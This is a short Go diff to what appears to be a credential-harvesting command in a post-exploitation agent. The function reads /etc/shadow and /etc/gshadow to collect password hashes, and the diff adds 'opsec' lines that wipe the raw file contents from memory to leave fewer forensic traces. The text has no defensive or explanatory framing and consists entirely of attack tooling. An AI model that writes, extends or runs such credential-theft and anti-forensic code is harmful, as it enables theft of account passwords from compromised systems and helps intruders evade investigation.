@@ -35,6 +35,7 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 	// /etc/shadow — hashed passwords
 	sb.WriteString("--- /etc/shadow ---\n")
 	if data, err := os.ReadFile("/etc/shadow"); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear raw shadow data
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
 		count := 0
 		for _, line := range lines {
@@ -110,6 +111,7 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 	// /etc/gshadow if readable
 	sb.WriteString("\n--- /etc/gshadow ---\n")
 	if data, err := os.ReadFile("/etc/gshadow"); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear raw gshadow data
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
 		count := 0
 		for _, line := range lines {
